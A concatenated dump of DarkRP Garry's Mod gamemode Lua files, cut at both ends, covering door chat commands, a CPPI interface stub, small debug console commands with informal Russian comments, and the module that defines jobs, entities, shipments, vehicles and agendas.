    description = "Force the door you're looking at to be locked. This is saved.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "forceunown",
    description = "Forcefully remove any owners from the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "forceown",
    description = "Forcefully make someone own the door you're looking at.",
    delay = 0.5
}

--PATH gamemodes/darkrp/gamemode/modules/customscripts/sh_cppi.lua:
if CPPI then return end
CPPI = {}
CPPI.CPPI_DEFER = 100100 --\100\100 = dd
CPPI.CPPI_NOTIMPLEMENTED = 7080

function CPPI:GetName()
    return "DarkRP"
end

function CPPI:GetVersion()
    return CPPI.CPPI_NOTIMPLEMENTED
end

function CPPI:GetInterfaceVersion()
    return CPPI.CPPI_NOTIMPLEMENTED
end

function CPPI:GetNameFromUID(uid)
    return CPPI.CPPI_NOTIMPLEMENTED
end

local PLAYER = FindMetaTable("Player")
function PLAYER:CPPIGetFriends()
    return CPPI.CPPI_NOTIMPLEMENTED
end

local ENTITY = FindMetaTable("Entity")
function ENTITY:CPPIGetOwner()
    return NULL, CPPI.CPPI_NOTIMPLEMENTED
end

if SERVER then
    function ENTITY:CPPISetOwner(ply)
        return CPPI.CPPI_NOTIMPLEMENTED
    end

    function ENTITY:CPPISetOwnerUID(UID)
        return CPPI.CPPI_NOTIMPLEMENTED
    end

    function ENTITY:CPPICanTool(ply, tool)
        return CPPI.CPPI_NOTIMPLEMENTED
    end

    function ENTITY:CPPICanPhysgun(ply)
        return CPPI.CPPI_NOTIMPLEMENTED
    end

    function ENTITY:CPPICanPickup(ply)
        return CPPI.CPPI_NOTIMPLEMENTED
    end

    function ENTITY:CPPICanPunt(ply)
        return CPPI.CPPI_NOTIMPLEMENTED
    end
end

--PATH gamemodes/darkrp/gamemode/modules/customscripts/cl_shit_mdl.lua:
local function r(n) return math.Round(n, 0) end

concommand.Add('info', function(pl) -- всё о хуйне которая стоит перед тобой
	local prop = pl:GetEyeTrace().Entity
	if IsValid(prop) then
		pl:PrintMessage(HUD_PRINTCONSOLE, prop:GetClass())
		pl:PrintMessage(HUD_PRINTCONSOLE, 'mdl = \''..prop:GetModel()..'\',')
		pl:PrintMessage(HUD_PRINTCONSOLE, 'pos = Vector('..string.gsub(tostring(prop:GetPos()), ' ', ', ')..'),')
		pl:PrintMessage(HUD_PRINTCONSOLE, 'ang = Angle('..string.gsub(tostring(prop:GetAngles()), ' ', ', ')..'),')
		pl:PrintMessage(HUD_PRINTCONSOLE, 'mat = \'' .. prop:GetMaterial() .. '\',')
	end
end)

concommand.Add('mypos', function(pl) -- выводит твои корды с запятыми сразу
	local pos = pl:GetPos()
	local ang = pl:GetAngles()
	pl:PrintMessage(HUD_PRINTCONSOLE, 'Vector(' .. r(pos.x) .. ', ' .. r(pos.y) .. ', ' .. r(pos.z) ..'),' )
	pl:PrintMessage(HUD_PRINTCONSOLE, 'Angle(' .. r(ang.x) .. ', ' .. r(ang.y) .. ', ' .. r(ang.z) ..'),' )
	SetClipboardText('Vector(' .. r(pos.x) .. ', ' .. r(pos.y) .. ', ' .. r(pos.z) ..')')
end)


local pq =  {}
concommand.Add('pos1', function(pl) -- Корды точек типо с 1-й точки до 2-й точек очень збс подходит для спауна к примеру
	pq[#pq + 1] = pl:GetPos()

	if (#pq >= 4) then
		pl:PrintMessage(HUD_PRINTCONSOLE, '{x = ' .. r(pq[1].x) .. ', y = ' .. r(pq[1].y) ..', x2 = ' .. r(pq[1].x) .. ', y2 = ' .. r(pq[2].y) .. '},')
		pl:PrintMessage(HUD_PRINTCONSOLE, '{x = ' .. r(pq[1].x) .. ', y = ' .. r(pq[2].y) ..', x2 = ' .. r(pq[3].x) .. ', y2 = ' .. r(pq[2].y) .. '},')
		pl:PrintMessage(HUD_PRINTCONSOLE, '{x = ' .. r(pq[3].x) .. ', y = ' .. r(pq[2].y) ..', x2 = ' .. r(pq[3].x) .. ', y2 = ' .. r(pq[1].y) .. '},')
		pl:PrintMessage(HUD_PRINTCONSOLE, '{x = ' .. r(pq[3].x) .. ', y = ' .. r(pq[1].y) ..', x2 = ' .. r(pq[1].x) .. ', y2 = ' .. r(pq[1].y) .. '},')
		pq = {}
	end
end)


--PATH gamemodes/darkrp/gamemode/modules/base/sh_createitems.lua:
local plyMeta = FindMetaTable("Player")

-----------------------------------------------------------
-- Job commands --
-----------------------------------------------------------
local function declareTeamCommands(CTeam)
    local k = 0
    for num, v in pairs(RPExtraTeams) do
        if v.command == CTeam.command then
            k = num
        end
    end

    local chatcommandCondition = function(ply)
        local plyTeam = ply:Team()

        if plyTeam == k then return false end
        if CTeam.admin == 1 and not ply:IsAdmin() or CTeam.admin == 2 and not ply:IsSuperAdmin() then return false end
        if isnumber(CTeam.NeedToChangeFrom) and plyTeam ~= CTeam.NeedToChangeFrom then return false end
        if istable(CTeam.NeedToChangeFrom) and not table.HasValue(CTeam.NeedToChangeFrom, plyTeam) then return false end
        if CTeam.customCheck and CTeam.customCheck(ply) == false then return false end
        if ply:isArrested() then return false end
        local numPlayers = team.NumPlayers(k)
        if CTeam.max ~= 0 and ((CTeam.max % 1 == 0 and numPlayers >= CTeam.max) or (CTeam.max % 1 ~= 0 and (numPlayers + 1) / player.GetCount() > CTeam.max)) then return false end
        if ply.LastJob and 10 - (CurTime() - ply.LastJob) >= 0 then return false end
        if ply.LastVoteCop and CurTime() - ply.LastVoteCop < 80 then return false end

        return true
    end

    if CTeam.vote or CTeam.RequiresVote then
        DarkRP.declareChatCommand{
            command = "vote" .. CTeam.command,
            description = "Vote to become " .. CTeam.name .. ".",
            delay = 1.5,
            condition =
                function(ply)
                    if CTeam.RequiresVote and not CTeam.RequiresVote(ply, k) then return false end
                    if CTeam.canStartVote and not CTeam.canStartVote(ply) then return false end

                    return chatcommandCondition(ply)
                end
        }

        DarkRP.declareChatCommand{
            command = CTeam.command,
            description = "Become " .. CTeam.name .. " and skip the vote.",
            delay = 1.5,
            condition =
                function(ply)
                    local requiresVote = CTeam.RequiresVote and CTeam.RequiresVote(ply, k)

                    if requiresVote then return false end
                    if requiresVote ~= false and CTeam.admin == 0 and not ply:IsAdmin() or CTeam.admin == 1 and not ply:IsSuperAdmin() then return false end
                    if CTeam.canStartVote and not CTeam.canStartVote(ply) then return false end

                    return chatcommandCondition(ply)
                end
        }
    else
        DarkRP.declareChatCommand{
            command = CTeam.command,
            description = "Become " .. CTeam.name .. ".",
            delay = 1.5,
            condition = chatcommandCondition
        }
    end
end

local canRun = false
local function addTeamCommands(CTeam, max)
    if CLIENT then return end

    local k = 0
    for num, v in pairs(RPExtraTeams) do
        if v.command == CTeam.command then
            k = num
        end
    end

    if CTeam.vote or CTeam.RequiresVote then
        DarkRP.defineChatCommand("vote" .. CTeam.command, function(ply)
            if CTeam.RequiresVote and not CTeam.RequiresVote(ply, k) then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("job_doesnt_require_vote_currently"))

                return ""
            end

            if CTeam.canStartVote and not CTeam.canStartVote(ply) then
                local reason = isfunction(CTeam.canStartVoteReason) and CTeam.canStartVoteReason(ply, CTeam) or CTeam.canStartVoteReason or ""
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("unable", "/vote" .. CTeam.command, reason))

                return ""
            end

            if CTeam.admin == 1 and not ply:IsAdmin() then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_admin", "/" .. "vote" .. CTeam.command))

                return ""
            elseif CTeam.admin > 1 and not ply:IsSuperAdmin() then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_sadmin", "/" .. "vote" .. CTeam.command))

                return ""
            end

            if isnumber(CTeam.NeedToChangeFrom) and ply:Team() ~= CTeam.NeedToChangeFrom then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_to_be_before", team.GetName(CTeam.NeedToChangeFrom), CTeam.name))

                return ""
            elseif istable(CTeam.NeedToChangeFrom) and not table.HasValue(CTeam.NeedToChangeFrom, ply:Team()) then
                local teamnames = ""

                for _, b in pairs(CTeam.NeedToChangeFrom) do
                    teamnames = teamnames .. " or " .. team.GetName(b)
                end

                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_to_be_before", string.sub(teamnames, 5), CTeam.name))

                return ""
            end

            if CTeam.customCheck and not CTeam.customCheck(ply) then
                local message = isfunction(CTeam.CustomCheckFailMsg) and CTeam.CustomCheckFailMsg(ply, CTeam) or CTeam.CustomCheckFailMsg or DarkRP.getPhrase("unable", team.GetName(t), "")
                DarkRP.notify(ply, 1, 4, message)

                return ""
            end

            local allowed, time = ply:changeAllowed(k)
            if not allowed then
                local notif = time and DarkRP.getPhrase("have_to_wait", math.ceil(time), "/job, " .. DarkRP.getPhrase("banned_or_demoted")) or DarkRP.getPhrase("unable", team.GetName(k), DarkRP.getPhrase("banned_or_demoted"))
                DarkRP.notify(ply, 1, 4, notif)

                return ""
            end

            if ply:Team() == k then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("unable", CTeam.command, ""))

                return ""
            end

            local numPlayers = team.NumPlayers(k)
            if max ~= 0 and ((max % 1 == 0 and numPlayers >= max) or (max % 1 ~= 0 and (tnumPlayers + 1) / player.GetCount() > max)) then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("team_limit_reached", CTeam.name))

                return ""
            end

            if ply.LastJob and 10 - (CurTime() - ply.LastJob) >= 0 then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("have_to_wait", math.ceil(10 - (CurTime() - ply.LastJob)), GAMEMODE.Config.chatCommandPrefix .. CTeam.command))

                return ""
            end

            ply.LastVoteCop = ply.LastVoteCop or -80

            if CurTime() - ply.LastVoteCop < 80 then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("have_to_wait", math.ceil(80 - (CurTime() - ply:GetTable().LastVoteCop)), GAMEMODE.Config.chatCommandPrefix .. CTeam.command))

                return ""
            end
			
            ES.CreateVote(ply, k)
            -- DarkRP.notify(ply, 1, 4, "Вы записались на голосование!")
			
			ply.LastVoteCop = CurTime()

            return ""
        end)

        local function onJobCommand(ply, hasPriv)
            if hasPriv then
                ply:changeTeam(k)
                return
            end

            local a = CTeam.admin
            if a > 0 and not ply:IsAdmin()
            or a > 1 and not ply:IsSuperAdmin()
            then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_admin", CTeam.name))
                return
            end

            if not CTeam.RequiresVote and
                (a == 0 and not ply:IsAdmin()
                or a == 1 and not ply:IsSuperAdmin()
                or a == 2)
            or CTeam.RequiresVote and CTeam.RequiresVote(ply, k)
            then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_to_make_vote", CTeam.name))
                return
            end

            ply:changeTeam(k)
        end
        DarkRP.defineChatCommand(CTeam.command, function(ply)
            CAMI.PlayerHasAccess(ply, "DarkRP_GetJob_" .. CTeam.command, fp{onJobCommand, ply})

            return ""
        end)
    else
        DarkRP.defineChatCommand(CTeam.command, function(ply)
            if CTeam.admin == 1 and not ply:IsAdmin() then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_admin", "/" .. CTeam.command))

                return ""
            end

            if CTeam.admin > 1 and not ply:IsSuperAdmin() then
                DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("need_sadmin", "/" .. CTeam.command))

                return ""
            end

            ply:changeTeam(k)

            return ""
        end)
    end

    concommand.Add("rp_" .. CTeam.command, function(ply, cmd, args)
        if ply:EntIndex() ~= 0 and not ply:IsAdmin() then
            ply:PrintMessage(HUD_PRINTCONSOLE, DarkRP.getPhrase("need_admin", cmd))
            return
        end

        if CTeam.admin > 1 and not ply:IsSuperAdmin() and ply:EntIndex() ~= 0 then
            ply:PrintMessage(HUD_PRINTCONSOLE, DarkRP.getPhrase("need_sadmin", cmd))
            return
        end

        if CTeam.vote then
            if CTeam.admin >= 1 and ply:EntIndex() ~= 0 and not ply:IsSuperAdmin() then
                ply:PrintMessage(HUD_PRINTCONSOLE, DarkRP.getPhrase("need_sadmin", cmd))
                return
            elseif CTeam.admin > 1 and ply:IsSuperAdmin() and ply:EntIndex() ~= 0 then
                ply:PrintMessage(HUD_PRINTCONSOLE, DarkRP.getPhrase("need_to_make_vote", CTeam.name))
                return
            end
        end

        if not args or not args[1] then
            DarkRP.printConsoleMessage(ply, DarkRP.getPhrase("invalid_x", DarkRP.getPhrase("arguments"), ""))
            return
        end

        local target = DarkRP.findPlayer(args[1])

        if not target then
            DarkRP.printConsoleMessage(ply, DarkRP.getPhrase("could_not_find", tostring(args[1])))
            return
        end

        target:changeTeam(k, true)
        local nick
        if (ply:EntIndex() ~= 0) then
            nick = ply:Nick()
        else
            nick = "Console"
        end
        DarkRP.notify(target, 0, 4, DarkRP.getPhrase("x_made_you_a_y", nick, CTeam.name))
    end)
end

local function addEntityCommands(tblEnt)
    DarkRP.declareChatCommand{
        command = tblEnt.cmd,
        description = "Purchase a " .. tblEnt.name,
        delay = 2,
        condition =
            function(ply)
                if ply:isArrested() then return false end
                if istable(tblEnt.allowed) and not table.HasValue(tblEnt.allowed, ply:Team()) then return false end
                if not ply:canAfford(tblEnt.price) then return false end
                if tblEnt.customCheck and tblEnt.customCheck(ply) == false then return false end

                return true
            end
    }

    if CLIENT then return end

    -- Default spawning function of an entity
    -- used if tblEnt.spawn is not defined
    local function defaultSpawn(ply, tr, tblE)
        local ent = ents.Create(tblE.ent)
        if not ent:IsValid() then error("Entity '" .. tblE.ent .. "' does not exist or is not valid.") end
        ent.dt = ent.dt or {}
        ent.dt.owning_ent = ply
        ent.pp_owner = ply
        ent:SetNW2Bool('PropIsOwned', true)
        ent:SetNW2String("PP_Owner",ply:Name())
        if ent.Setowning_ent then ent:Setowning_ent(ply) end
        if ent:GetClass() == "stcasino_ragingrubies" then
        ent:SetPos(tr.HitPos + Vector(0,0,40))
        elseif ent:GetClass() == "metal_detector" then
        ent:SetPos(tr.HitPos + Vector(0,0,60))
        else
        ent:SetPos(tr.HitPos)
        end
        -- These must be set before :Spawn()
        ent.SID = ply.SID
        ent.allowed = tblE.allowed
        ent.DarkRPItem = tblE
        ent:Spawn()

        local phys = ent:GetPhysicsObject()
        if phys:IsValid() then phys:Wake() end

        return ent
    end

    local function buythis(ply, args)
        if ply:isArrested() then return "" end
        if type(tblEnt.allowed) == "table" and not table.HasValue(tblEnt.allowed, ply:Team()) then
            DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("incorrect_job", tblEnt.name))
            return ""
        end

        if tblEnt.customCheck and not tblEnt.customCheck(ply) then
            local message = isfunction(tblEnt.CustomCheckFailMsg) and tblEnt.CustomCheckFailMsg(ply, tblEnt) or
                tblEnt.CustomCheckFailMsg or
                DarkRP.getPhrase("not_allowed_to_purchase")
            DarkRP.notify(ply, 1, 4, message)
            return ""
        end

        if ply:customEntityLimitReached(tblEnt) then
            DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("limit", tblEnt.name))
            return ""
        end

        local canbuy, suppress, message, price = hook.Call("canBuyCustomEntity", nil, ply, tblEnt)

        local cost = price or tblEnt.getPrice and tblEnt.getPrice(ply, tblEnt.price) or tblEnt.price

        if not ply:canAfford(cost) then
            DarkRP.notify(ply, 1, 4, DarkRP.getPhrase("cant_afford", tblEnt.name))
            return ""
        end

        if canbuy == false then
            if not suppress and message then DarkRP.notify(ply, 1, 4, message) end
            return ""
        end

        ply:addMoney(-cost)

        local trace = {}
        trace.start = ply:EyePos()
        trace.endpos = trace.start + ply:GetAimVector() * 85
        trace.filter = ply

        local tr = util.TraceLine(trace)

        local ent = (tblEnt.spawn or defaultSpawn)(ply, tr, tblEnt)
        ent.onlyremover = not tblEnt.allowTools
        -- Repeat these properties to alleviate work in tblEnt.spawn:
        ent.SID = ply.SID
        ent.allowed = tblEnt.allowed
        ent.DarkRPItem = tblEnt

        hook.Call("playerBoughtCustomEntity", nil, ply, tblEnt, ent, cost)

        if cost == 0 then
            DarkRP.notify(ply, 0, 4, DarkRP.getPhrase("you_got_yourself", tblEnt.name))
        else
            DarkRP.notify(ply, 0, 4, DarkRP.getPhrase("you_bought", tblEnt.name, DarkRP.formatMoney(cost), ""))
        end

        ply:addCustomEntity(tblEnt)
        return ""
    end
    DarkRP.defineChatCommand(tblEnt.cmd, buythis)
end

RPExtraTeams = {}
local jobByCmd = {}
DarkRP.getJobByCommand = function(cmd)
    if not jobByCmd[cmd] then return nil, nil end
    return RPExtraTeams[jobByCmd[cmd]], jobByCmd[cmd]
end
plyMeta.getJobTable = function(ply)
    local tbl = RPExtraTeams[ply:Team()]
    -- don't error when the player has not fully joined yet
    if not tbl and (ply.DarkRPInitialised or ply.DarkRPDataRetrievalFailed) then
        DarkRP.error(
            string.format("There is a player with an invalid team!\n\nThe player's name is %s, their team number is \"%s\", which has the name \"%s\"",
                ply:EntIndex() == 0 and "Console" or IsValid(ply) and ply:Nick() or "unknown",
                ply:Team(),
                team.GetName(ply:Team())),
            1,
            {
                "It is the server owner's responsibility to figure out why that player has no valid team.",
                "This error is very likely to be caused by an earlier error. If you don't see any errors in your own console, look at the server console."
            }
        )
    end
    return tbl
end
local jobCount = 0
function DarkRP.createJob(Name, colorOrTable, model, Description, Weapons, command, maximum_amount_of_this_class, Salary, admin, Vote, Haslicense, NeedToChangeFrom, CustomCheck)
    local tableSyntaxUsed = not IsColor(colorOrTable)

    local CustomTeam = tableSyntaxUsed and colorOrTable or
        {color = colorOrTable, model = model, description = Description, weapons = Weapons, command = command,
            max = maximum_amount_of_this_class, salary = Salary, admin = admin or 0, vote = tobool(Vote), hasLicense = Haslicense,
            NeedToChangeFrom = NeedToChangeFrom, customCheck = CustomCheck
        }
    CustomTeam.name = Name
    CustomTeam.default = DarkRP.DARKRP_LOADING

    -- Disabled job
    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["jobs"][CustomTeam.command] then return end

    local valid, err, hints = DarkRP.validateJob(CustomTeam)
    if not valid then DarkRP.error(string.format("Corrupt team: %s!\n%s", CustomTeam.name or "", err), 2, hints) end

    jobCount = jobCount + 1
    CustomTeam.team = jobCount

    CustomTeam.salary = math.floor(CustomTeam.salary)

    CustomTeam.customCheck           = CustomTeam.customCheck           and fp{DarkRP.simplerrRun, CustomTeam.customCheck}
    CustomTeam.CustomCheckFailMsg = isfunction(CustomTeam.CustomCheckFailMsg) and fp{DarkRP.simplerrRun, CustomTeam.CustomCheckFailMsg} or CustomTeam.CustomCheckFailMsg
    CustomTeam.CanPlayerSuicide      = CustomTeam.CanPlayerSuicide      and fp{DarkRP.simplerrRun, CustomTeam.CanPlayerSuicide}
    CustomTeam.PlayerCanPickupWeapon = CustomTeam.PlayerCanPickupWeapon and fp{DarkRP.simplerrRun, CustomTeam.PlayerCanPickupWeapon}
    CustomTeam.PlayerDeath           = CustomTeam.PlayerDeath           and fp{DarkRP.simplerrRun, CustomTeam.PlayerDeath}
    CustomTeam.PlayerLoadout         = CustomTeam.PlayerLoadout         and fp{DarkRP.simplerrRun, CustomTeam.PlayerLoadout}
    CustomTeam.PlayerSelectSpawn     = CustomTeam.PlayerSelectSpawn     and fp{DarkRP.simplerrRun, CustomTeam.PlayerSelectSpawn}
    CustomTeam.PlayerSetModel        = CustomTeam.PlayerSetModel        and fp{DarkRP.simplerrRun, CustomTeam.PlayerSetModel}
    CustomTeam.PlayerSpawn           = CustomTeam.PlayerSpawn           and fp{DarkRP.simplerrRun, CustomTeam.PlayerSpawn}
    CustomTeam.PlayerSpawnProp       = CustomTeam.PlayerSpawnProp       and fp{DarkRP.simplerrRun, CustomTeam.PlayerSpawnProp}
    CustomTeam.RequiresVote          = CustomTeam.RequiresVote          and fp{DarkRP.simplerrRun, CustomTeam.RequiresVote}
    CustomTeam.ShowSpare1            = CustomTeam.ShowSpare1            and fp{DarkRP.simplerrRun, CustomTeam.ShowSpare1}
    CustomTeam.ShowSpare2            = CustomTeam.ShowSpare2            and fp{DarkRP.simplerrRun, CustomTeam.ShowSpare2}
    CustomTeam.canStartVote          = CustomTeam.canStartVote          and fp{DarkRP.simplerrRun, CustomTeam.canStartVote}

    jobByCmd[CustomTeam.command] = table.insert(RPExtraTeams, CustomTeam)
    DarkRP.addToCategory(CustomTeam, "jobs", CustomTeam.category)
    team.SetUp(#RPExtraTeams, Name, CustomTeam.color)
    local Team = #RPExtraTeams

    timer.Simple(0, function()
        declareTeamCommands(CustomTeam)
        addTeamCommands(CustomTeam, CustomTeam.max)
    end)

    -- Precache model here. Not right before the job change is done
    if type(CustomTeam.model) == "table" then
        for _, v in pairs(CustomTeam.model) do util.PrecacheModel(v) end
    else
        util.PrecacheModel(CustomTeam.model)
    end
    return Team
end
AddExtraTeam = DarkRP.createJob

local function removeCustomItem(tbl, category, hookName, reloadF4, i)
    local item = tbl[i]
    tbl[i] = nil
    if category then DarkRP.removeFromCategory(item, category) end
    if istable(item) and (item.command or item.cmd) then DarkRP.removeChatCommand(item.command or item.cmd) end
    hook.Run(hookName, i, item)
    if CLIENT and reloadF4 and IsValid(DarkRP.getF4MenuPanel()) then DarkRP.getF4MenuPanel():Remove() end -- Rebuild entire F4 menu frame
end

function DarkRP.removeJob(i)
    local job = RPExtraTeams[i]
    jobByCmd[job.command] = nil
    jobCount = jobCount - 1

    DarkRP.removeChatCommand("vote" .. job.command)
    removeCustomItem(RPExtraTeams, "jobs", "onJobRemoved", true, i)
end

RPExtraTeamDoors = {}
RPExtraTeamDoorIDs = {}
local maxTeamDoorID = 0
function DarkRP.createEntityGroup(name, ...)
    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["doorgroups"][name] then return end
    RPExtraTeamDoors[name] = {...}
    RPExtraTeamDoors[name].name = name

    maxTeamDoorID = maxTeamDoorID + 1
    RPExtraTeamDoorIDs[name] = maxTeamDoorID
end
AddDoorGroup = DarkRP.createEntityGroup

DarkRP.removeEntityGroup = fp{removeCustomItem, RPExtraTeamDoors, nil, "onEntityGroupRemoved", false}

CustomVehicles = {}
CustomShipments = {}
local shipByName = {}
DarkRP.getShipmentByName = function(name)
    name = string.lower(name or "")

    if not shipByName[name] then return nil, nil end
    return CustomShipments[shipByName[name]], shipByName[name]
end

function DarkRP.createShipment(name, model, entity, price, Amount_of_guns_in_one_shipment, Sold_separately, price_separately, noshipment, classes, shipmodel, CustomCheck)
    local tableSyntaxUsed = type(model) == "table"

    price = tonumber(price)
    local shipmentmodel = shipmodel or "models/Items/item_item_crate.mdl"

    local customShipment = tableSyntaxUsed and model or
        {model = model, entity = entity, price = price, amount = Amount_of_guns_in_one_shipment,
        seperate = Sold_separately, pricesep = price_separately, noship = noshipment, allowed = classes,
        shipmodel = shipmentmodel, customCheck = CustomCheck, weight = 5}

    -- The pains of backwards compatibility when dealing with ancient spelling errors...
    if customShipment.separate ~= nil then
        customShipment.seperate = customShipment.separate
    end
    customShipment.separate = customShipment.seperate

    if customShipment.allowed == nil then
        customShipment.allowed = {}
        for k in pairs(team.GetAllTeams()) do
            table.insert(customShipment.allowed, k)
        end
    end

    customShipment.name = name
    customShipment.default = DarkRP.DARKRP_LOADING
    customShipment.shipmodel = customShipment.shipmodel or shipmentmodel

    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["shipments"][customShipment.name] then return end

    local valid, err, hints = DarkRP.validateShipment(customShipment)
    if not valid then DarkRP.error(string.format("Corrupt shipment: %s!\n%s", name or "", err), 2, hints) end

    customShipment.spawn = customShipment.spawn and fp{DarkRP.simplerrRun, customShipment.spawn}
    customShipment.allowed = isnumber(customShipment.allowed) and {customShipment.allowed} or customShipment.allowed
    customShipment.customCheck = customShipment.customCheck   and fp{DarkRP.simplerrRun, customShipment.customCheck}
    customShipment.CustomCheckFailMsg = isfunction(customShipment.CustomCheckFailMsg) and fp{DarkRP.simplerrRun, customShipment.CustomCheckFailMsg} or customShipment.CustomCheckFailMsg

    if not customShipment.noship then DarkRP.addToCategory(customShipment, "shipments", customShipment.category) end
    if customShipment.separate then DarkRP.addToCategory(customShipment, "weapons", customShipment.category) end

    shipByName[string.lower(name or "")] = table.insert(CustomShipments, customShipment)
    util.PrecacheModel(customShipment.model)
end
AddCustomShipment = DarkRP.createShipment

function DarkRP.removeShipment(i)
    local ship = CustomShipments[i]
    shipByName[ship.name] = nil
    removeCustomItem(CustomShipments, "shipments", "onShipmentRemoved", true, i)
end

function DarkRP.createVehicle(Name_of_vehicle, model, price, Jobs_that_can_buy_it, customcheck)
    local vehicle = istable(Name_of_vehicle) and Name_of_vehicle or
        {name = Name_of_vehicle, model = model, price = price, allowed = Jobs_that_can_buy_it, customCheck = customcheck}

    vehicle.default = DarkRP.DARKRP_LOADING

    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["vehicles"][vehicle.name] then return end

    local found = false
    for k in pairs(DarkRP.getAvailableVehicles()) do
        if string.lower(k) == string.lower(vehicle.name) then found = true break end
    end

    local valid, err, hints = DarkRP.validateVehicle(vehicle)
    if not valid then DarkRP.error(string.format("Corrupt vehicle: %s!\n%s", vehicle.name or "", err), 2, hints) end

    if not found then DarkRP.error("Vehicle invalid: " .. vehicle.name .. ". Unknown vehicle name.", 2) end

    vehicle.customCheck = vehicle.customCheck and fp{DarkRP.simplerrRun, vehicle.customCheck}
    vehicle.CustomCheckFailMsg = isfunction(vehicle.CustomCheckFailMsg) and fp{DarkRP.simplerrRun, vehicle.CustomCheckFailMsg} or vehicle.CustomCheckFailMsg

    table.insert(CustomVehicles, vehicle)
    DarkRP.addToCategory(vehicle, "vehicles", vehicle.category)
end
AddCustomVehicle = DarkRP.createVehicle

DarkRP.removeVehicle = fp{removeCustomItem, CustomVehicles, "vehicles", "onVehicleRemoved", true}

--[[---------------------------------------------------------------------------
Decides whether a custom job or shipmet or whatever can be used in a certain map
---------------------------------------------------------------------------]]
function GM:CustomObjFitsMap(obj)
    if not obj or not obj.maps then return true end

    local map = string.lower(game.GetMap())
    for _, v in pairs(obj.maps) do
        if string.lower(v) == map then return true end
    end
    return false
end

DarkRPEntities = {}
function DarkRP.createEntity(name, entity, model, price, max, command, classes, CustomCheck)
    local tableSyntaxUsed = type(entity) == "table"

    local tblEnt = tableSyntaxUsed and entity or
        {ent = entity, model = model, price = price, max = max,
        cmd = command, allowed = classes, customCheck = CustomCheck}
    tblEnt.name = name
    tblEnt.default = DarkRP.DARKRP_LOADING

    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["entities"][tblEnt.name] then return end

    if type(tblEnt.allowed) == "number" then
        tblEnt.allowed = {tblEnt.allowed}
    end

    local valid, err, hints = DarkRP.validateEntity(tblEnt)
    if not valid then DarkRP.error(string.format("Corrupt entity: %s!\n%s", name or "", err), 2, hints) end

    tblEnt.customCheck = tblEnt.customCheck and fp{DarkRP.simplerrRun, tblEnt.customCheck}
    tblEnt.CustomCheckFailMsg = isfunction(tblEnt.CustomCheckFailMsg) and fp{DarkRP.simplerrRun, tblEnt.CustomCheckFailMsg} or tblEnt.CustomCheckFailMsg
    tblEnt.getPrice    = tblEnt.getPrice    and fp{DarkRP.simplerrRun, tblEnt.getPrice}
    tblEnt.getMax      = tblEnt.getMax      and fp{DarkRP.simplerrRun, tblEnt.getMax}
    tblEnt.spawn       = tblEnt.spawn       and fp{DarkRP.simplerrRun, tblEnt.spawn}

    -- if SERVER and FPP then
    --  FPP.AddDefaultBlocked(blockTypes, tblEnt.ent)
    -- end

    table.insert(DarkRPEntities, tblEnt)
    DarkRP.addToCategory(tblEnt, "entities", tblEnt.category)
    timer.Simple(0, function() addEntityCommands(tblEnt) end)
end
AddEntity = DarkRP.createEntity

DarkRP.removeEntity = fp{removeCustomItem, DarkRPEntities, "entities", "onEntityRemoved", true}

-- here for backwards compatibility
DarkRPAgendas = {}

local agendas = {}
-- Returns the agenda managed by the player
plyMeta.getAgenda = fn.Compose{fn.Curry(fn.Flip(fn.GetValue), 2)(DarkRPAgendas), plyMeta.Team}

-- Returns the agenda this player is member of
function plyMeta:getAgendaTable()
    return agendas[self:Team()]
end

DarkRP.getAgendas = fp{fn.Id, agendas}

function DarkRP.createAgenda(Title, Manager, Listeners)
    if DarkRP.DARKRP_LOADING and DarkRP.disabledDefaults["agendas"][Title] then return end

    local agenda = {Manager = Manager, Title = Title, Listeners = Listeners, ManagersByKey = {}}
    agenda.default = DarkRP.DARKRP_LOADING

    local valid, err, hints = DarkRP.validateAgenda(agenda)
    if not valid then DarkRP.error(string.format("Corrupt agenda: %s!\n%s", agenda.Title or "", err), 2, hints) end

    for _, v in pairs(agenda.Listeners) do
        agendas[v] = agenda
    end

    for _, v in pairs(istable(agenda.Manager) and agenda.Manager or {agenda.Manager}) do
        agendas[v] = agenda
        DarkRPAgendas[v] = agenda -- backwards compat
        agenda.ManagersByKey[v] = true
    end

    if SERVER then
        timer.Simple(0, function()
            -- Run after scripts have loaded
            agenda.text = hook.Run("agendaUpdated", nil, agenda, "")
        end)
    end
end
AddAgenda = DarkRP.createAgenda

function DarkRP.removeAgenda(title)
    local agenda
    for k, v in pairs(agendas) do
        if v.Title == title then
            agenda = v
            agendas[k] = nil
        end
    end

    for k, v in pairs(DarkRPAgendas) do
        if v.Title == title then DarkRPAgendas[k] = nil end
    end
    hook.Run("onAgendaRemoved", title, agenda)
end

GM.DarkRPGroupChats = {}
local groupChatNumber = 0
function DarkRP.createGroupChat(funcOrTeam, ...)
    local gm = GM or GAMEMODE
    gm.DarkRPGroupChats = gm.DarkRPGroupChats or {}
    if DarkRP.DARKRP_LOADING then
        groupChatNumber = groupChatNumber + 1
        if DarkRP.disabledDefaults["groupchat"][groupChatNumber] then return end
    end
    -- People can enter either functions or a list of teams as parameter(s)
    if type(funcOrTeam) == "function" then
        table.insert(gm.DarkRPGroupChats, fp{DarkRP.simplerrRun, funcOrTeam})
    else
        local teams = {funcOrTeam, ...}
